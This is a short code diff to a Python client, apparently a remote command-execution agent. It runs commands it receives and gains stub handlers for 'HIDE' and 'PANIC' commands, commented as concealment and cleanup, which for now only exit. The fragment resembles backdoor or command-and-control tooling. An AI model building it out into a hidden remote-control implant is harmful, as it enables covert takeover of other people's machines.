@@ -33,6 +33,14 @@ def runClient():
         cmd = dec_recv_msg.strip().split(" ",1)
         print(cmd)
 
+        #handle special commands
+        if (cmd[0] == "HIDE"):
+        	#Execute a hide
+        	exit(0)
+        elif (cmd[0] == "PANIC"):
+        	#clean up
+        	exit(0)
+
         cmd_output = ""
         #try to execute the command
         try:
@@ -42,7 +50,7 @@ def runClient():
         	return_msg = "command failed"
         	continue
         else:
-        	cmd_output = "EXECUTED COMMAND:" + str(rawout.stdout,'utf-8')
+        	cmd_output = "EXECUTED COMMAND\n" + str(rawout.stdout,'utf-8')
         	pass
         finally:
         	pass
